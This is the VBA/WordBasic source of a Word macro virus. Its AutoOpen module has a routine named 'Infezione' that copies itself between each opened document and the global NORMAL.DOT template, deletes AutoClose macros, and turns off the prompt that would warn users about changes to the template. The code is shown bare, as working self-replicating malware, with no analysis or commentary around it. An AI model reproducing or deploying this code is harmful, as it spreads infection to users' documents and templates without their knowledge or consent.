   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim filetemp$
   Infezione
   filetemp$ = WordBasic.[MacroFileName$]("AutoClose")
   If filetemp$ <> "" Then
   WordBasic.Organizer Delete:=1, Source:=filetemp$, Name:="AutoClose", Tab:=3
   End If
   filetemp$ = WordBasic.[MacroFileName$]("AutoClose")
   If filetemp$ <> "" Then
       WordBasic.Organizer Delete:=1, Source:=filetemp$, Name:="AutoClose", Tab:=3
   End If
   End Sub

   Private Sub Infezione()
   Dim fileattuale$
   Dim normaldot$
   Dim min_
   Dim dataeoraatt$
   Dim dataeorasalv$
   Dim dlg As Object
   Dim libcopia1$

   fileattuale$ = ""
   On Error Resume Next
   fileattuale$ = WordBasic.[FileName$]()

   normaldot$ = UCase(WordBasic.[DefaultDir$](2) + "\NORMAL.DOT")
   min_ = WordBasic.Minute(WordBasic.Now())

   dataeoraatt$ = WordBasic.[Date$]() + " " + WordBasic.[Time$]()
   dataeorasalv$ = ""
   If fileattuale$ <> "" Then
       WordBasic.FileSummaryInfo FileName:=fileattuale$
           Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
           WordBasic.CurValues.FileSummaryInfo dlg
       dataeorasalv$ = dlg.LastSavedDate
   End If

   If dataeorasalv$ = dataeoraatt$ Then GoTo fine
       If WordBasic.[MacroFileName$]("AutoOpen") <> fileattuale$ Then WordBasic.FileSaveAs Format:=1
       libcopia1$ = "false"
       If fileattuale$ <> "" And fileattuale$ <> normaldot$ And WordBasic.[MacroFileName$]("AutoOpen") = normaldot$ Then
           WordBasic.Organizer Copy:=1, Source:=normaldot$, Destination:=fileattuale$, Name:="AutoOpen", Tab:=3
           libcopia1$ = "true"
       End If
       If fileattuale$ <> "" And fileattuale$ <> normaldot$ And WordBasic.[MacroFileName$]("AutoOpen") <> normaldot$ And libcopia1$ = "false" Then WordBasic.Organizer Copy:=1, Source:=fileattuale$, Destination:=normaldot$, Name:="AutoOpen", Tab:=3
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   fine:
   End Sub
